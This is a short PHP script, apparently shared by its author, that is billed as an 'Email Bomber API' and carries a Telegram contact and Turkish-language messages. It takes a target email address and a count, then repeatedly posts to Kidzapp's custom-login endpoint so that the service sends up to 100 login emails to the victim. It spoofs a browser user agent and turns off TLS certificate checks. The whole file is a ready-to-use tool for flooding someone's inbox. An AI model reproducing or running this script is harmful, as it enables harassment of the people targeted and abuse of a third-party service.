<?php
/**
 * Email Bomber API - Kidzapp
 * Telegram: @unutur
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$email = isset($_GET['email']) ? $_GET['email'] : (isset($_POST['email']) ? $_POST['email'] : null);
$count = isset($_GET['count']) ? (int)$_GET['count'] : (isset($_POST['count']) ? (int)$_POST['count'] : 10);

if (!$email) {
    echo json_encode([
        'success' => false,
        'error' => 'Email gerekli',
        'kullanım' => '/bomber.php?email=ornek@gmail.com&count=10',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode([
        'success' => false,
        'error' => 'Geçersiz email formatı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if ($count > 100) {
    $count = 100;
}

$url = "https://api.kidzapp.com/api/3.0/customlogin/";
$success = 0;
$failed = 0;

for ($i = 0; $i < $count; $i++) {
    $headers = [
        'authority: api.kidzapp.com',
        'accept: application/json',
        'content-type: application/json',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ];
    
    $data = json_encode([
        'email' => $email,
        'sdk' => 'web',
        'platform' => 'desktop'
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if (strpos($response, 'EMAIL SENT') !== false || $httpCode == 200) {
        $success++;
    } else {
        $failed++;
    }
    
    usleep(500000); // 0.5 saniye bekle
}

echo json_encode([
    'success' => true,
    'email' => $email,
    'hedef' => $count,
    'gonderilen' => $success,
    'basarisiz' => $failed,
    'telegram' => '@unutur'
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>